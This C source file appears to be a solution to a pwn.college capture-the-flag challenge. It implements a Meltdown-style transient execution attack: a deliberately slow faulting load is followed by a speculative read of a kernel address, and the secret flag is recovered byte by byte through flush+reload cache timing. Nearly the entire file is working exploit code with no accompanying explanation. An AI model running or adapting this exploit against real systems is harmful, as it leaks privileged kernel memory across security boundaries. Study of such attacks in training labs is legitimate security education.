#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <semaphore.h>
#include <x86intrin.h>

#define PAGE_SIZE 0x1000

#define FLAG_PREFIX "pwn.college"
#define FLAGLEN  59 
#define START 32
#define END 0x7f

#define REPEAT 1000
#define THRESHOLD 180
#define KERNEL_ADDR 0xffffffffc0002460
struct page_data {
    char data[PAGE_SIZE];
}* page_ptr;

static int dev_fd;
static jmp_buf jbuf;

#define COMM  ioctl(dev_fd, 0, 0); 

#define for_each_char(var) for (int var = START; var < END; var++)

size_t measure(void* ptr)
{
    register void* reg_ptr asm("rdi") = ptr;
    size_t start, end;
    _mm_lfence();

    start = __rdtsc();
    _mm_lfence();
    asm volatile("mov r8, qword ptr [%0]"
                :
                : "r" (reg_ptr)
                : "r8"
                );
    _mm_lfence();
    end   = __rdtsc();

    return end - start;
}

static inline __attribute__((always_inline)) void slow_segfault(void)
{
    // we need a seq of slow and dependent instruction 
    // so that we win the microcode race to the target

    asm volatile(
        "mov r14, 0x1337;"
        "push r14;"
        "fild QWORD PTR [rsp];"
        "fsqrt;"
        "fistp QWORD PTR [rsp];"
        "pop r14;"
        "mov r14, [r14]" // segfault
    );
}

// !!!DANGEROUS!!!
void spec_exploit1(size_t target_addr) 
{
    register void* ptr asm("rbx") = page_ptr;
    register void* target asm("rdi") = (void*) target_addr;

    slow_segfault();

    asm volatile(
        "xor rcx, rcx;"
        "mov cl, BYTE PTR [%0];"
        "shl rcx, 12;"
        "add %1, rcx;"
        "mov %1, [%1];"
        :
        : "r" (target), "r" (ptr)
        : "rcx"
    );
}

void spec_exploit(size_t target_addr) 
{
    asm volatile(
        "lea rbx, [%0];"
        "xor rcx, rcx;"

        // slow op
        "mov rax, 0x1337;"
        "push rax;"
        "fild  QWORD PTR [rsp];"
        "fsqrt;"
        "fistp QWORD PTR [rsp];"
        "pop rax;"
        "mov rax, [rax];" // segfault
                         
        // exploit
        "mov cl, BYTE PTR [%1];"
        "shl rcx, 12;"
        "add rbx, rcx;"
        "mov rbx, [rbx];"
        :
        : "r" (page_ptr),"r" (target_addr)
        : "rcx", "rbx", "rax"
    );
}


void flush_pages(int start, int end)
{
    for (int i = start; i <= end; i++)
        _mm_clflush(&page_ptr[i]);
}

void sigfault_handler(int signo) {
    longjmp(jbuf, 1); 
}

void get_timing_data(size_t hits[END], size_t threshold);
int process_data(size_t hits[END], size_t i);

int main(void)
{
    char flag[FLAGLEN] = {0};
    size_t threshold = THRESHOLD;

    struct sigaction sigsegv_act = {0};
    sigsegv_act.sa_handler = sigfault_handler;
    sigsegv_act.sa_flags = SA_NODEFER;
    if (sigaction(SIGSEGV, &sigsegv_act, NULL) < 0) {
        perror("signal");
        exit(1);
    }

    page_ptr = mmap(NULL, (END +1) * PAGE_SIZE, 
                    PROT_WRITE | PROT_READ,
                    MAP_PRIVATE| MAP_ANONYMOUS | MAP_POPULATE,
                    -1, 0);
    if (page_ptr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    dev_fd = open("/proc/pwncollege", O_RDWR);
    if (dev_fd < 0) {
        perror("open");
        exit(1);
    }

AGAIN:
    for (int i = 0; i < FLAGLEN; i++)
    {
        size_t hits[END] = {0};

        for (int _ = 0; _ < REPEAT; _++)
        {
            if (!setjmp(jbuf)) {
                flush_pages(START, END);
                COMM; // Loads flag into the CPU cache!
                      
                spec_exploit1(KERNEL_ADDR + i);
            }

            get_timing_data(hits, threshold);
        }

        flag[i] = process_data(hits, i);
        if (flag[i]) {
            printf("\n\n - %c with hits of %zu - \n\n", flag[i], hits[flag[i]]);
        }
        else --i;
    }

    printf("flag: %s\n", flag);
    if (memcmp(flag, FLAG_PREFIX, sizeof FLAG_PREFIX-1))
        goto AGAIN;
}

void get_timing_data(size_t hits[END], size_t threshold)
{
    for_each_char(j)
    {
        volatile int mix_j = ((j * j) * 2);
        mix_j = ( mix_j / j ) ^ 1;
        mix_j ^= 1;
        mix_j /= 2;

        size_t time = measure(&page_ptr[mix_j]);
        if (time <= threshold)
            hits[mix_j] += 1;
    }
}

int process_data(size_t hits[END], size_t i)
{
    size_t max_hits = 0;
    int ch = 0;
    for_each_char(j)
    {
        size_t hit = hits[j];
        if (hit)
            printf("%2zu/%3d (%c) - hits: %ld\n", i, j, j, hit);
        if (hit && max_hits < hit) {
            max_hits = hit;
            ch = j;
        }
    }

    return ch;
}

